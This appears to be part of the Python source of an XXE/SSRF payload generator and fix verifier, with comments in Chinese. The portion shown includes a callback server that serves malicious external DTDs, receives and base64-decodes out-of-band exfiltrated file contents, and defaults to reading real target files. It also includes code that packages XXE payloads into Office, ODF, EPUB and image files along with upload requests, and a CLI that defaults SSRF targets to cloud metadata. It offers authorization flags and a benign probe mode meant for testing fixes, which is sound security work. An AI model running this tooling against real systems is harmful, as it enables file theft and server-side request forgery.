    def _dispatch(self, body: bytes) -> None:
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        params.update(self._parse_body(body))

        host = (self.headers.get("Host") or "").strip()
        label = self._label()
        cat, rid = self._classify(label)

        info = self.canary_map.get(label) if self.canary_map else None
        data = params.get("data") or params.get("d") or params.get("p") or ""

        event = {
            "time": _iso_now(),
            "path": path,
            "host": host,
            "label": label,
            "category": cat,
            "run_id": rid,
            "source_ip": self.client_address[0] if self.client_address else "unknown",
            "user_agent": self.headers.get("User-Agent", ""),
            "method": self.command,
            "query": params,
        }

        # 1) OOB 外带数据（无论落在哪个路径）
        if data:
            event["type"] = "oob_data"
            event["data"] = data
            if info:
                event["payload"] = info.get("payload", "")
            # php://filter 的 base64 输出带换行，URL 里会被截断，
            # 去掉空白后仍可还原大部分内容
            if (params.get("enc") or self.oob_mode or "") in ("b64", "auto"):
                try:
                    event["decoded"] = base64.b64decode(
                        re.sub(r"\s+", "", data)).decode("utf-8", "replace")
                except Exception:
                    pass
            self._append_log(event)
            print(f"[OOB:{cat}] from {event['source_ip']} len={len(data)} :: "
                  f"{data[:200]!r}")
            self._send(200, b"")
            return

        # 2) DTD 分发
        if path == "/evil.dtd":
            event["type"] = "dtd_fetch"
            event["dtd"] = "error_based"
            self._append_log(event)
            print(f"[DTD:error_based] fetched by {event['source_ip']}")
            self._send(200, self._errdtd_body().encode("utf-8"),
                       "application/xml-dtd")
            return

        if path == "/oob.dtd":
            enc = (params.get("enc") or self.oob_mode or "plain").lower()
            if enc not in ("plain", "b64", "ftp", "auto"):
                enc = "plain"
            if enc == "plain":
                print("[!] plain 模式不做编码，多行文件内容会在首个换行处截断；"
                      "建议 --oob-mode auto")
            event["type"] = "dtd_fetch"
            event["dtd"] = f"oob:{enc}"
            self._append_log(event)
            print(f"[DTD:oob:{enc}] fetched by {event['source_ip']}")
            self._send(200, self._oobdtd_body(enc).encode("utf-8"),
                       "application/xml-dtd")
            return

        # 3) 显式探测端点
        detail = f"  payload={info['payload']}" if info else ""

        if path in ("/canary", "/ping"):
            event["type"] = "canary"
            if info:
                event["payload"] = info.get("payload", "")
            self._append_log(event)
            print(f"[CANARY:{cat}] from {event['source_ip']} "
                  f"host={host} label={label}{detail}")
            self._send(200, b"OK")
            return

        # 4) 疑似 canary（子域名或 /c/{label} 路径）
        if cat != "uncategorized":
            event["type"] = "canary"
            if info:
                event["payload"] = info.get("payload", "")
            self._append_log(event)
            print(f"[CANARY:{cat}] from {event['source_ip']} "
                  f"host={host} label={label}{detail}")
            self._send(200, b"OK")
            return

        # 5) 未知路径
        event["type"] = "unknown"
        self._append_log(event)
        self._send(404, b"Not Found")


def start_dtd_server(port: int = 8080, target_file: str = "/etc/hostname",
                     bind: str = "127.0.0.1", log_file: str = "callbacks.jsonl",
                     target_os: str = "linux", oob_mode: str = "plain",
                     public_host: Optional[str] = None,
                     canary_map: Optional[Dict[str, Dict]] = None,
                     target_platform: str = "java",
                     benign: bool = False,
                     ftp_host: Optional[str] = None) -> None:
    handler = type("BoundHandler", (MaliciousDTDHandler,), {
        "target_file": target_file,
        "target_os": target_os,
        "target_platform": target_platform,
        "log_file": log_file,
        "oob_mode": oob_mode,
        "public_host": public_host,
        "canary_map": canary_map or {},
        "benign": benign,
        "ftp_host": ftp_host,
    })

    if benign:
        mode_line = ("无害模式  : 开 (--probe) —— DTD 内的 %file 指向 canary，"
                     "不读取真实文件")
    else:
        mode_line = (f"[!] 攻击模式: /evil.dtd 与 /oob.dtd 会引导目标读取真实文件 "
                     f"{target_file}（修复验证请加 --probe）")

    print(f"""
[*] DTD / Canary 服务器启动
    监听      : {bind}:{port}
    目标文件  : {target_file}
    {mode_line}
    外带模式  : {oob_mode}
    FTP 外带  : {ftp_host if ftp_host else "未指定（默认 host:21，需自备 FTP 接收端）"}
    日志      : {log_file}
    canary 表 : {len(canary_map or {})} 条
    端点      : /evil.dtd  /oob.dtd?enc=plain|b64|ftp|auto  /canary  /ping
                /c/{{label}}            <- canary 路径形态（attacker 为 IP 时）

[*] 上传 ./verify 下全部产物后，检查 {log_file}
    零回连 = 修复生效；有回连 = 该场景仍存在 XXE/SSRF

[!] 前提检查（任一不成立则"零回连"毫无意义）:
    1. 目标确实能访问到 {bind}:{port}（跨网时需公网 IP + --public-host）
    2. 已用 --canary-map 载入 canary_map.json，否则日志里只有类别没有产物名
    3. 若 --attacker-url 用的是 IP，DNS canary 探针不生效，请用路径形态产物
    4. 无害验证请用 --probe 启动本服务（否则 DTD 会读取真实 --target-file）
""")

    server = ThreadingHTTPServer((bind, port), handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
    finally:
        server.server_close()


# ============================================================================
# 第八部分：产物自校验 + 报告 + 落盘（[P3-1] 新增自校验）
# ============================================================================

class ArtifactVerifier:
    """对生成的产物做合法性校验，避免"生成的 docx 根本打不开"这类问题。"""

    @staticmethod
    def _wellformed(data: bytes) -> Tuple[bool, str]:
        """
        良构性检查。

        Payload 里必然含有 <!DOCTYPE ... SYSTEM "..."> 与 &xxe;，
        用 ElementTree 直接解析会报 "undefined entity" 造成误报。
        这里用 expat 并把外部实体视为空，只校验结构本身是否良构。
        """
        p = expat.ParserCreate()
        p.SetParamEntityParsing(expat.XML_PARAM_ENTITY_PARSING_NEVER)
        p.ExternalEntityRefHandler = lambda *args: 1
        try:
            p.Parse(data, True)
            return True, ""
        except expat.ExpatError as e:
            return False, str(e)

    @staticmethod
    def check_zip(path: str) -> Tuple[bool, List[str]]:
        problems: List[str] = []
        ext = os.path.splitext(path)[1].lower()

        try:
            with zipfile.ZipFile(path) as zf:
                bad = zf.testzip()
                if bad:
                    problems.append(f"ZIP 数据损坏: {bad}")
                names = set(zf.namelist())

                # ---- OPC (OOXML) 专属校验 ----
                if ext in (".docx", ".xlsx", ".pptx"):
                    for required in ("[Content_Types].xml", "_rels/.rels"):
                        if required not in names:
                            problems.append(f"缺少 {required}")

                    if "[Content_Types].xml" in names:
                        try:
                            ct = zf.read("[Content_Types].xml").decode("utf-8")
                        except (KeyError, UnicodeDecodeError) as e:
                            ct = ""
                            problems.append(f"[Content_Types].xml 读取失败: {e}")
                        if "<Override" not in ct:
                            problems.append("[Content_Types].xml 缺少 Override 声明")
                        main = _OOXML_MAIN.get(ext[1:], ("", ""))[0]
                        if main and main not in ct:
                            problems.append(
                                f"[Content_Types].xml 未声明主部件 /{main}")

                    # 关系不能指向不存在的部件（v2.0 就栽在这里）
                    for n in sorted(names):
                        if not n.endswith(".rels"):
                            continue
                        base = os.path.dirname(os.path.dirname(n))
                        try:
                            root = ET.fromstring(zf.read(n))
                        except ET.ParseError as e:
                            problems.append(f"{n} 不是良构 XML: {e}")
                            continue
                        for rel in root:
                            tgt = rel.get("Target", "")
                            if tgt.startswith(("http:", "https:", "ftp:", "file:")):
                                continue
                            resolved = os.path.normpath(
                                os.path.join(base, tgt)).replace("\\", "/")
                            if resolved not in names:
                                problems.append(f"{n} 悬空关系 -> {tgt}")

                # ---- ODF 专属校验 ----
                elif ext in (".odt", ".ods", ".odp"):
                    for required in ("mimetype", "META-INF/manifest.xml",
                                     "content.xml", "styles.xml",
                                     "meta.xml", "settings.xml"):
                        if required not in names:
                            problems.append(f"缺少 ODF 必需部件: {required}")
                    if "mimetype" in names:
                        try:
                            if zf.getinfo("mimetype").compress_type != zipfile.ZIP_STORED:
                                problems.append("ODF mimetype 必须是 STORED（不压缩）")
                        except KeyError:
                            pass
                    if "META-INF/manifest.xml" in names:
                        try:
                            man = zf.read("META-INF/manifest.xml").decode("utf-8")
                        except UnicodeDecodeError:
                            man = ""
                        for p_name in ("content.xml", "styles.xml",
                                       "meta.xml", "settings.xml"):
                            if p_name in names and p_name not in man:
                                problems.append(
                                    f"manifest.xml 未声明 {p_name}")

                # ---- EPUB 专属校验 ----
                elif ext == ".epub":
                    for required in ("mimetype", "META-INF/container.xml"):
                        if required not in names:
                            problems.append(f"缺少 EPUB 必需部件: {required}")
                    if "mimetype" in names:
                        try:
                            if zf.getinfo("mimetype").compress_type != zipfile.ZIP_STORED:
                                problems.append("EPUB mimetype 必须是 STORED（不压缩）")
                        except KeyError:
                            pass

                # ---- 通用：所有 XML 部件的良构性 ----
                for n in sorted(names):
                    if n.endswith((".xml", ".rels", ".opf", ".xhtml")):
                        good, err = ArtifactVerifier._wellformed(zf.read(n))
                        if not good:
                            problems.append(f"{n} 不是良构 XML: {err}")

        except zipfile.BadZipFile as e:
            problems.append(f"不是合法 ZIP: {e}")
        return (not problems), problems

    @staticmethod
    def _extract_xmp(data: bytes) -> Optional[bytes]:
        """
        [v2.3][P1] 从图片中提取 XMP 包字节。

        v2.2 的 check_image 只查 PNG CRC / JPEG 标记序列，从不看 XMP 内容，
        导致"XMP 非良构、探针已死"也能拿 100% 通过 —— 假阳性比不校验更危险。
        """
        if data[:8] == b"\x89PNG\r\n\x1a\n":
            i = 8
            while i + 8 <= len(data):
                ln = struct.unpack(">I", data[i:i + 4])[0]
                ctype = data[i + 4:i + 8]
                if ctype == b"iTXt":
                    raw = data[i + 8:i + 8 + ln]
                    kw = b"XML:com.adobe.xmp"
                    pos = raw.find(kw)
                    if pos >= 0 and raw[pos + len(kw):pos + len(kw) + 5] == b"\x00" * 5:
                        # keyword + 5 个 null（flag/method/lang/trans 均为空）之后是文本
                        return raw[pos + len(kw) + 5:]
                i += 12 + ln
            return None

        if data[:2] == b"\xff\xd8":
            i = 2
            while i + 4 <= len(data):
                if data[i] != 0xFF:
                    return None
                m = data[i + 1]
                if m in (0xD8, 0xD9) or 0xD0 <= m <= 0xD7:
                    i += 2
                    continue
                ln = struct.unpack(">H", data[i + 2:i + 4])[0]
                if m == 0xE1:
                    seg = data[i + 4:i + 2 + ln]
                    uri = b"http://ns.adobe.com/xap/1.0/\x00"
                    if seg.startswith(uri):
                        return seg[len(uri):]
                if m == 0xDA:
                    return None
                i += 2 + ln
            return None

        return None

    @staticmethod
    def check_image(path: str) -> Tuple[bool, List[str]]:
        problems: List[str] = []
        try:
            with open(path, "rb") as f:
                data = f.read()
        except OSError as e:
            return False, [str(e)]

        if data[:8] == b"\x89PNG\r\n\x1a\n":
            i, seen = 8, []
            while i < len(data):
                if i + 8 > len(data):
                    problems.append("PNG chunk 长度越界")
                    break
                ln = struct.unpack(">I", data[i:i + 4])[0]
                ctype = data[i + 4:i + 8]
                if i + 12 + ln > len(data):
                    problems.append(f"PNG chunk {ctype!r} 截断")
                    break
                crc = struct.unpack(">I", data[i + 8 + ln:i + 12 + ln])[0]
                if crc != (zlib.crc32(ctype + data[i + 8:i + 8 + ln]) & 0xFFFFFFFF):
                    problems.append(f"PNG chunk {ctype!r} CRC 错误")
                seen.append(ctype.decode("latin1"))
                i += 12 + ln
            if seen[:1] != ["IHDR"]:
                problems.append("PNG 缺少 IHDR")
            if seen[-1:] != ["IEND"]:
                problems.append("PNG 缺少 IEND")

        elif data[:2] == b"\xff\xd8":
            if data[-2:] != b"\xff\xd9":
                problems.append("JPEG 缺少 EOI")
            i = 2
            order = []
            while i < len(data) - 1:
                if data[i] != 0xFF:
                    problems.append("JPEG 标记序列错位")
                    break
                m = data[i + 1]
                if m in (0xD8, 0xD9) or 0xD0 <= m <= 0xD7:
                    order.append(m)
                    i += 2
                    continue
                if i + 4 > len(data):
                    problems.append("JPEG 段长度越界")
                    break
                ln = struct.unpack(">H", data[i + 2:i + 4])[0]
                order.append(m)
                if m == 0xDA:
                    break
                i += 2 + ln
            if order[:1] == [0xE1] and 0xE0 in order:
                problems.append("JPEG APP1(XMP) 位于 APP0(JFIF) 之前，违反规范顺序")
        else:
            problems.append("无法识别的图片格式")
            return (not problems), problems

        # [v2.3][P1] 本工具产出的图片一律携带 XMP 载荷，缺块或非良构都是死探针
        xmp = ArtifactVerifier._extract_xmp(data)
        if xmp is None:
            problems.append("未找到 XMP 块（iTXt/APP1）")
        else:
            good, err = ArtifactVerifier._wellformed(xmp)
            if not good:
                problems.append(f"XMP 包不是良构 XML: {err}")
        return (not problems), problems

    @staticmethod
    def check_xml(path: str) -> Tuple[bool, List[str]]:
        try:
            with open(path, "rb") as f:
                good, err = ArtifactVerifier._wellformed(f.read())
            return (True, []) if good else (False, [f"非良构 XML: {err}"])
        except OSError as e:
            return False, [str(e)]

    # ---------------- [A2] 语义层校验 ----------------

    _PARAM_DECL_RE = re.compile(
        r"<!ENTITY\s+%\s*([A-Za-z_][\w.\-]*)\s+SYSTEM\s", re.I)
    _PARAM_ANY_DECL_RE = re.compile(
        r"<!ENTITY\s+%\s*([A-Za-z_][\w.\-]*)")
    _PARAM_ESC_DECL_RE = re.compile(
        r"<!ENTITY\s+&#(?:x25|37);\s+([A-Za-z_][\w.\-]*)")
    _PARAM_REF_RE = re.compile(r"%([\w.\-]+);")
    _BARE_AMP_RE = re.compile(
        r"&(?!#[0-9]+;|#[xX][0-9a-fA-F]+;|[A-Za-z_][\w.\-]*;)")
    _OOB_URL_RE = re.compile(
        r"""(?:SYSTEM|href)\s*['"]\s*(https?://[^'"\s]*?%[\w.\-]+;)""")

    @classmethod
    def check_semantics(cls, payload: str, name: str = "") -> List[str]:
        """
        v2.1 的 --verify-artifacts 只做良构性检查，于是 error_based 那种
        "声明了 %ext 却从不引用"的死 payload 也能拿到"全部产物通过"。
        这里补上语义层：语法合法但功能已死的 payload 必须能被发现。
        """
        doc = payload or ""
        problems: List[str] = []

        declared = set(cls._PARAM_ANY_DECL_RE.findall(doc))
        declared |= set(cls._PARAM_ESC_DECL_RE.findall(doc))

        # 1) 参数实体声明后必须被引用（[A1] 的直接防线）
        for ent in cls._PARAM_DECL_RE.findall(doc):
            if not re.search(rf"%{re.escape(ent)}\s*;", doc):
                problems.append(
                    f"参数实体 %{ent}; 已声明但从未引用，外部 DTD 不会被加载")

        # 2) 不得引用未声明的参数实体
        for ref in sorted(set(cls._PARAM_REF_RE.findall(doc))):
            if ref in declared:
                continue
            if f"&#x25;{ref}" in doc or f"&#37;{ref}" in doc:
                continue
            problems.append(f"引用了未声明的参数实体 %{ref};")

        # 3) OOB 外带未做编码时告警（多行文件必然在首个换行处截断）
        for m in cls._OOB_URL_RE.finditer(doc):
            if "%file;" in m.group(1):
                problems.append(
                    "OOB 外带 URL 未做编码，多行文件内容会在首个换行处截断"
                    "（改用 --oob-mode b64 或 ftp）")
                break

        # 4) 文本节点中的裸 &（如 CSS @import 未转义，产出的 XML 非良构）
        body = re.sub(r"<!\[CDATA\[.*?\]\]>", "", doc, flags=re.S)
        if cls._BARE_AMP_RE.search(body):
            problems.append("存在未转义的 & ，产出的 XML 非良构")

        return problems

    @classmethod
    def verify_dir(cls, root: str) -> Tuple[int, int, List[str]]:
        ok = bad = 0
        problems: List[str] = []
        for dirpath, _, files in os.walk(root):
            for fn in sorted(files):
                if fn.endswith(("_meta.json", "report.txt", "_http_request.txt",
                                "_fragment.txt", "_evil.dtd", "_mtom.txt")):
                    continue
                p = os.path.join(dirpath, fn)
                rel = os.path.relpath(p, root)
                if fn.endswith((".docx", ".xlsx", ".pptx", ".odt", ".ods",
                                ".odp", ".epub")):
                    good, probs = cls.check_zip(p)
                elif fn.endswith((".jpg", ".png")):
                    good, probs = cls.check_image(p)
                elif fn.endswith((".xml", ".svg", ".xlf", ".plist", ".kml",
                                  ".gpx", ".xmp", ".wsdl", ".xsd", ".xsl")):
                    good, probs = cls.check_xml(p)
                else:
                    continue
                if good:
                    ok += 1
                else:
                    bad += 1
                    for pr in probs:
                        problems.append(f"{rel}: {pr}")
        return ok, bad, problems


class ReportHelper:
    @staticmethod
    def generate_text_report(results: Dict[str, List[Dict]]) -> str:
        lines = []
        lines.append("=" * 80)
        lines.append("XXE / SSRF Payload 生成报告 v" + VERSION)
        lines.append("=" * 80)
        lines.append("")

        total = 0
        for category, payloads in results.items():
            if not payloads:
                continue
            lines.append(f"\n{'#' * 80}")
            lines.append(f"# {category}  ({len(payloads)} 个)")
            lines.append(f"{'#' * 80}")
            total += len(payloads)

            for i, p in enumerate(payloads, 1):
                lines.append(f"\n[{i}] {p.get('name', 'unnamed')}")
                lines.append(f"    技术      : {p.get('technique', 'N/A')}")
                if p.get("description"):
                    lines.append(f"    说明      : {p['description']}")
                if p.get("injection_point"):
                    lines.append(f"    注入点    : {p['injection_point']}")
                if p.get("method"):
                    lines.append(f"    HTTP 方法 : {p['method']}")
                if p.get("content_type"):
                    lines.append(f"    CT        : {p['content_type']}")
                if p.get("target_component"):
                    lines.append(f"    投递组件  : {', '.join(p['target_component'])}")
                if p.get("benign"):
                    lines.append("    无害模式  : 是（不读取真实文件）")
                if p.get("dtd_path"):
                    lines.append(f"    本地 DTD  : {p['dtd_path']}")
                if p.get("expected_when_fixed"):
                    lines.append(f"    修复后    : {p['expected_when_fixed']}")
                if p.get("expected_when_vulnerable"):
                    lines.append(f"    未修复时  : {p['expected_when_vulnerable']}")
                if p.get("requirements"):
                    lines.append("    前提条件:")
                    for r in p["requirements"]:
                        lines.append(f"      - {r}")

        lines.append("")
        lines.append("=" * 80)
        lines.append(f"总计生成 {total} 个 Payload")
        lines.append("=" * 80)
        return "\n".join(lines)

    @staticmethod
    def generate_coverage_report(results: Dict[str, List[Dict]],
                                 all_categories: List[str],
                                 reference: Optional[Dict[str, int]] = None
                                 ) -> str:
        """
        [A5] v2.1 只报告"类别是否出现"，17/17 看着很满，实际探针覆盖率 20%。
        这里同时给出类别覆盖率与探针覆盖率的真实数字，让适用边界一目了然。
        """
        reference = reference or {}
        covered = [c for c in all_categories if results.get(c)]
        missing = [c for c in all_categories if not results.get(c)]
        n_probe = sum(len(v) for v in results.values())
        n_ref = sum(reference.get(c, 0) for c in all_categories)

        head = f"类别覆盖: {len(covered)}/{len(all_categories)}"
        if n_ref:
            head += (f"    探针覆盖: {n_probe}/{n_ref}"
                     f" ({n_probe * 100.0 / n_ref:.0f}%)")
        else:
            head += f"    探针总数: {n_probe}"

        lines = ["", "=" * 80, "修复验证覆盖矩阵", "=" * 80, head, ""]
        for c in covered:
            total = reference.get(c)
            n = len(results[c])
            if total:
                pct = n * 100.0 / total
                flag = "" if pct >= 100.0 else "  <- 未取全"
                lines.append(
                    f"  [x] {c:<14} {n:>2}/{total:<2} 探针 "
                    f"({pct:>3.0f}%){flag}")
            else:
                lines.append(f"  [x] {c:<14} {n:>2} 探针")
        if missing:
            lines.append(f"未覆盖场景类别 ({len(missing)}):")
            for c in missing:
                lines.append(f"  [ ] {c}")
        lines += [
            "",
            "已知未纳入本套件的技术面（需人工补充验证）:",
            "  - UTF-16 / UTF-7 编码绕过变体",
            "  - netdoc: / gopher: / ftp: 协议变体（jar: 已在 local_dtd 覆盖）",
            "  - PHP expect://（XXE -> RCE）",
            "  - PDF XFA / FDF 内嵌 XML",
            "  - JSON -> XML 转换网关",
            "  - Billion Laughs / 实体扩展 DoS（仅有 1000 字符的轻量探针）",
            "  - WAF 绕过变体（注释插入 / 压缩 body / CT 混淆）",
            "",
            "结论适用边界: 本套件零回连仅代表上述已覆盖类别的入口已修复,",
            "              不代表目标系统对所有 XXE 变体免疫。",
            "=" * 80,
        ]
        return "\n".join(lines)


def save_payloads_to_files(results: Dict[str, List[Dict]], output_dir: str,
                           verify: bool = False,
                           canary_map: Optional[Dict[str, Dict]] = None
                           ) -> None:
    ensure_dir(output_dir)
    failures: List[str] = []
    semantic: List[str] = []

    for category, payloads in results.items():
        if not payloads:
            continue

        category_dir = os.path.join(output_dir, safe_filename(category))
        ensure_dir(category_dir)

        for index, p in enumerate(payloads, 1):
            name = safe_filename(p.get("name", f"payload_{index}"))
            payload = p.get("payload", "")
            file_ext = p.get("file_ext", ".xml")
            prefix = f"{index:02d}_{name}"

            # [A2] 语义自校验：语法合法但功能已死的 payload 必须被拦下
            for key, blob in (("payload", payload),
                              ("evil_dtd", p.get("evil_dtd", ""))):
                for prob in ArtifactVerifier.check_semantics(blob, name):
                    semantic.append(f"{prefix} ({key}): {prob}")

            try:
                if p.get("ooxml_kind"):
                    file_path = os.path.join(category_dir, prefix + file_ext)
                    create_ooxml_package(
                        p["ooxml_kind"], payload, file_path,
                        injection=p.get("ooxml_injection", "customxml"))
                elif p.get("odf_kind"):
                    file_path = os.path.join(category_dir, prefix + file_ext)
                    create_odf_package(
                        p["odf_kind"], payload, file_path,
                        mimetype=p.get("odf_mimetype",
                                       "application/vnd.oasis.opendocument.text"),
                        injection=p.get("odf_injection", "content"))
                elif p.get("epub"):
                    file_path = os.path.join(category_dir, prefix + ".epub")
                    create_epub_package(payload, file_path)
                elif p.get("binary_carrier"):
                    file_path = os.path.join(category_dir, prefix + file_ext)
                    create_binary_carrier(p["binary_carrier"], payload, file_path)
                else:
                    file_path = os.path.join(category_dir, prefix + file_ext)
                    with open(file_path, "w", encoding="utf-8") as f:
                        f.write(payload)
            except (OSError, ValueError, zipfile.BadZipFile, struct.error,
                    KeyError, TypeError) as e:
                failures.append(f"{prefix}: {type(e).__name__}: {e}")
                continue

            # 附加产物：evil.dtd
            if p.get("evil_dtd"):
                with open(os.path.join(category_dir, f"{prefix}_evil.dtd"),
                          "w", encoding="utf-8") as f:
                    f.write(p["evil_dtd"])

            # 附加产物：multipart 上传样例
            if (p.get("binary_carrier") or p.get("ooxml_kind")
                    or p.get("odf_kind") or file_ext in (".svg", ".jpg", ".png")):
                try:
                    with open(file_path, "rb") as f:
                        raw = f.read()
                    body, ct = TransportWrapper.multipart_upload(
                        "/upload", "file", os.path.basename(file_path),
                        raw, p.get("content_type", "application/octet-stream"))
                    req = TransportWrapper.build_http_request(
                        "POST", "/upload", "TARGET_HOST", ct, body)
                    with open(os.path.join(category_dir, f"{prefix}_http_request.txt"),
                              "wb") as f:
                        f.write(req)
                except OSError as e:
                    failures.append(f"{prefix}: multipart 样例生成失败 {e}")

            # [P2-2] 附加产物：SOAP MTOM 封装
            if p.get("soap_mtom"):
                try:
                    body, ct = TransportWrapper.soap_with_attachment(
                        payload.encode("utf-8"), "TARGET_HOST", "/services/Service",
                        soap_action=p.get("headers", {}).get("SOAPAction", "urn:probe"))
                    req = TransportWrapper.build_http_request(
                        "POST", "/services/Service", "TARGET_HOST", ct, body,
                        extra_headers={"SOAPAction": p.get("headers", {}).get(
                            "SOAPAction", "urn:probe")})
                    with open(os.path.join(category_dir, f"{prefix}_mtom.txt"),
                              "wb") as f:
                        f.write(req)
                except OSError as e:
                    failures.append(f"{prefix}: MTOM 封装失败 {e}")

            # 附加产物：meta
            meta = dict(p)
            for k in ("payload", "evil_dtd", "raw_xml", "base64_saml"):
                if k in meta:
                    meta[k] = "[saved separately]"
            try:
                with open(os.path.join(category_dir, f"{prefix}_meta.json"),
                          "w", encoding="utf-8") as f:
                    json.dump(meta, f, ensure_ascii=False, indent=2)
            except OSError as e:
                failures.append(f"{prefix}: meta 写入失败 {e}")

    # [A4] 落盘 canary 映射表：回调响了可以反查是哪个产物、哪个注入点
    if canary_map:
        try:
            cpath = os.path.join(output_dir, "canary_map.json")
            with open(cpath, "w", encoding="utf-8") as f:
                json.dump(canary_map, f, ensure_ascii=False, indent=2)
            emit(f"[+] canary 映射表已保存到: {cpath}  ({len(canary_map)} 条)")
            emit("[*] 启动回调服务器时用 --canary-map 指向它，"
                 "日志会直接回填 payload 名")
        except OSError as e:
            failures.append(f"canary_map.json: {e}")

    # [A2] 语义告警单独成段，不与"保存失败"混淆
    if semantic:
        emit(f"\n[!] 语义自校验发现 {len(semantic)} 处问题"
             f"（产物仍已写出，但这些 payload 很可能不会按预期工作）:")
        for msg in semantic[:40]:
            emit(f"    - {msg}")
        if len(semantic) > 40:
            emit(f"    ... 还有 {len(semantic) - 40} 条")

    report = ReportHelper.generate_text_report(results)
    try:
        with open(os.path.join(output_dir, "report.txt"), "w", encoding="utf-8") as f:
            f.write(report)
    except OSError as e:
        failures.append(f"report.txt: {e}")

    emit(f"[+] Payload 已保存到: {output_dir}")
    emit(f"[+] 报告已保存到: {os.path.join(output_dir, 'report.txt')}")

    if failures:
        emit(f"\n[!] 有 {len(failures)} 项保存失败:")
        for msg in failures:
            emit(f"    - {msg}")

    # [P3-1] 产物自校验
    if verify:
        ok, bad, problems = ArtifactVerifier.verify_dir(output_dir)
        emit(f"\n[*] 产物自校验: 通过 {ok} 项, 失败 {bad} 项")
        for msg in problems[:40]:
            emit(f"    - {msg}")
        if len(problems) > 40:
            emit(f"    ... 还有 {len(problems) - 40} 条")
        if bad == 0 and not semantic:
            emit("[+] 全部产物通过合法性、良构性与语义校验")
        elif bad == 0:
            emit("[+] 容器合法性与 XML 良构性全部通过（语义告警见上）")


# ============================================================================
# 第九部分：命令行界面
# ============================================================================

BENIGN_MODES = {"fingerprint", "verify_fix"}

# v2.1 漏了 fingerprint（7 个解析器配置探针，恰恰是信息量最大的一类），
# 于是 verify_fix 的"17/17 已覆盖"里根本没算它。
ALL_CATEGORIES = [
    "basic", "local_dtd", "error_based", "blind_ssrf", "xinclude", "schema_ssrf",
    "fingerprint", "soap", "svg", "office_ooxml", "office_odf", "epub",
    "xmp_image", "misc_xml", "saml", "rss_atom", "webdav", "spring_xml",
]


def print_banner():
    print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║      XXE / SSRF Payload Generator & Fix Verifier  v{VERSION:<14}     ║
║                                                                      ║
║      场景: SOAP | SVG | OOXML | ODF | EPUB | XMP(JPG/PNG) | SAML     ║
║            RSS/Atom | WebDAV | Spring | XLIFF | PLIST | KML/GPX      ║
║                                                                      ║
║      防御: Fingerprint 指纹识别 | verify_fix 修复验证套件            ║
║      校验: --verify-artifacts 容器合法性 + XML 良构 + 语义自校验     ║
║                                                                      ║
║      仅用于授权安全测试、靶场验证、内部合规评估                      ║
╚══════════════════════════════════════════════════════════════════════╝
""")


def list_modes():
    print("""
攻击面模式 (需授权):
  basic          基础外部实体
  local_dtd      Local DTD Reuse (出网受限环境)
  error_based    Error-Based XXE
  blind_ssrf     Blind SSRF (参数实体/DOCTYPE/DNS canary)
  xinclude       XInclude 文件读取/SSRF
  schema_ssrf    Schema Location SSRF (+ XSD include/import)
  soap           SOAP 1.1/1.2/XInclude/Schema/WSDL (+ MTOM 封装)
  svg            SVG 上传/转换/预览 (+ xlink / CSS @import)
  office         OOXML docx/xlsx/pptx (customXml/document/core.xml 多注入点)
  odf            ODF odt/ods/odp (content.xml/meta.xml)
  epub           EPUB 电子书
  xmp_image      JPG/PNG XMP 元数据注入 (生成真实可解码图片)
  misc_xml       Excel2003 XML / XLIFF / PLIST / KML / GPX / POM / XSLT
  saml           SAML Response (Raw/Base64 POST/Schema)
  rss_atom       RSS / Atom Feed
  webdav         WebDAV PROPFIND / CalDAV REPORT
  spring_xml     Spring XML 配置

防御/验证模式:
  fingerprint    解析器指纹识别 (天然无害, 7 个探针)
  verify_fix     修复验证套件 (每类全量探针 + 指纹，输出真实覆盖率)
  --probe        全局无害开关: 所有模式的 file/ssrf 替换为 canary

综合模式:
  scenario_auto  全部业务场景
  auto           全部 (攻击面 + 指纹)

服务:
  --serve        启动 DTD/Canary HTTP Server (支持 GET/POST/HEAD)

关键参数:
  --target-file  目标文件 (默认 /etc/hostname)
  --attacker-url DTD/Canary 服务器地址
  --ssrf-url     SSRF 目标 (默认云元数据)
  --oob-mode     外带编码: plain | b64(PHP) | ftp(Java 多行) | auto(按平台选)
  --ftp-host     FTP 外带接收端 host[:port] (默认 21)，独立于 HTTP 回调端口
  --canary-map   载入 canary_map.json，回调日志直接显示是哪个产物触发的
  --public-host  回调服务器的对外地址 (目标走代理时必填)
  --dtd-db       自定义本地 DTD 素材 JSON
  --probe        无害模式 (生成与 --serve 均生效: file/ssrf 目标及服务端
                 DTD 全部替换为 canary，不读取真实文件)
  --verify-artifacts  生成后自动校验产物合法性
  -o             输出目录 (现在对全部模式生效)
  --json         JSON 输出 (stdout 只含纯 JSON，过程信息走 stderr)
  --i-have-authorization  确认已获书面授权 (攻击面模式必需)
""")


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="XXE/SSRF Payload 生成与防御验证工具 v2.3",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
示例:
  # 攻击面测试 (授权环境)
  python %(prog)s --mode office -f /etc/hostname -o ./office_out -Y
  python %(prog)s --mode xmp_image -a http://your-server:8080 -o ./xmp_out -Y
  python %(prog)s --mode odf -o ./odf_out -Y

  # 防御验证工作流 (服务端也要加 --probe，保证 DTD 不读真实文件)
  python %(prog)s --serve --port 8080 --bind 0.0.0.0 --yes --probe   # 终端1
  python %(prog)s --mode verify_fix -a http://YOUR_IP:8080 -o ./verify
  python %(prog)s --mode verify_fix -a http://YOUR_IP:8080 -o ./verify \\
                  --verify-artifacts
  # 上传 ./verify 下全部文件, 检查 callbacks.jsonl 零回连即修复有效

  # 指纹识别 (先摸清解析器配置再选 Payload)
  python %(prog)s --mode fingerprint -o ./fp

  # 全量无害探测
  python %(prog)s --mode auto --probe -a http://YOUR_IP:8080 -o ./probe_out

  # 产物自校验
  python %(prog)s --mode office -o ./out --verify-artifacts -Y
        """))

    parser.add_argument("--mode", "-m", choices=[
        "basic", "local_dtd", "error_based", "blind_ssrf", "xinclude", "schema_ssrf",
        "soap", "svg", "office", "odf", "epub", "xmp_image", "misc_xml",
        "saml", "rss_atom", "webdav", "spring_xml",
        "fingerprint", "verify_fix",
        "scenario_auto", "auto",
    ], help="Payload 生成模式")

    parser.add_argument("--list", "-l", action="store_true", help="列出可用模式")
    parser.add_argument("--platform", "-p", default="java",
                        choices=["java", "dotnet", "php"], help="目标平台")
    parser.add_argument("--os", default="linux",
                        choices=["linux", "windows"], help="目标操作系统")
